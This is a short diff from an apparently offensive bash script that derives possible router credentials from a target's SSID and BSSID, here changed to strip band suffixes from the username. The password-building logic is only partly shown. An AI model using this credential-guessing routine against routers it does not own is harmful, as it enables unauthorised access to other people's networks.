@@ -126,7 +126,7 @@ then
 	then
 		echo -e "${BLUE} [*] Possible router credentials ${END}"
 		echo -ne "${GREEN} [+] USER:  "
-		cat /tmp/ssid_atk.txt | cut -d " " -f1
+		cat /tmp/ssid_atk.txt | cut -d " " -f1 | sed 's/_2G/_/' | sed 's/_5G/_/'
 		echo -ne "${GREEN} [+] PASS:  "
 		PT1=$(cat /tmp/bssid_atk.txt | sed 's/://g' | cut -c -10)
 		PT2=$(cat /tmp/ssid_atk.txt | cut -d " " -f1 | rev | cut -c -2 | rev)
